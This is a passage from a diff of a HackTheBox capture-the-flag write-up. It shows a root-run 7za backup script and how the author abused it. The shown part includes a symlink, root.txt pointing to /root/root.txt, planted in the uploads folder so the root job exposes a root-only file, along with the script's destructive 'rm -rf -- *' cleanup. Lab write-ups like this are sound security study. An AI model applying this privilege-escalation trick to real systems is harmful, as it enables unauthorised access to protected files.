+<span class="nb">ls</span> <span class="nt">-1t</span> <span class="k">*</span>.zip | tail <span class="nt">-n</span> +11 | xargs rm <span class="nt">-f</span>
 
-# get the files from the honeypot and backup 'em all
-cd /var/www/html/uploads
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+<span class="c"># get the files from the honeypot and backup 'em all</span>
+<span class="nb">cd</span> /var/www/html/uploads
+7za a /backup/<span class="nv">$filename</span>.zip <span class="nt">-t7z</span> <span class="nt">-snl</span> <span class="nt">-p</span><span class="nv">$pass</span> <span class="nt">--</span> <span class="k">*</span>
 
-# cleaup the honeypot
-rm -rf -- *
+<span class="c"># cleaup the honeypot</span>
+rm <span class="nt">-rf</span> <span class="nt">--</span> <span class="k">*</span>
 
-# comment the next line to get errors for debugging
-truncate -s 0 /backup/error.log
-[ldapuser@ctf backup]$ 
+<span class="c"># comment the next line to get errors for debugging</span>
+truncate <span class="nt">-s</span> 0 /backup/error.log
+<span class="o">[</span>ldapuser@ctf backup]<span class="nv">$ </span>
 </code></pre></div></div>
 <p><br> Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use <code class="highlighter-rouge">pspy</code>, it was obvious since it’s accessing <code class="highlighter-rouge">/root/root.txt</code> to create the password and only root can access that.
 <br> 	Basically one of the things that this script is doing is that it’s backing up all the files in <code class="highlighter-rouge">/var/www/html/uploads</code> by using <code class="highlighter-rouge">7za</code> to put all the uploads in one archive. Let’s look at the command again :
@@ -665,7 +660,7 @@ drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
 lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&gt; /root/root.txt
 </code></pre></div></div>
 <p><br> Everything is fine let’s check the error log :
-<img src="/images/hackthebox/ctf/17.png" alt="">
+<br><img src="/images/hackthebox/ctf/17.png" alt=""><br>
 <br> And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
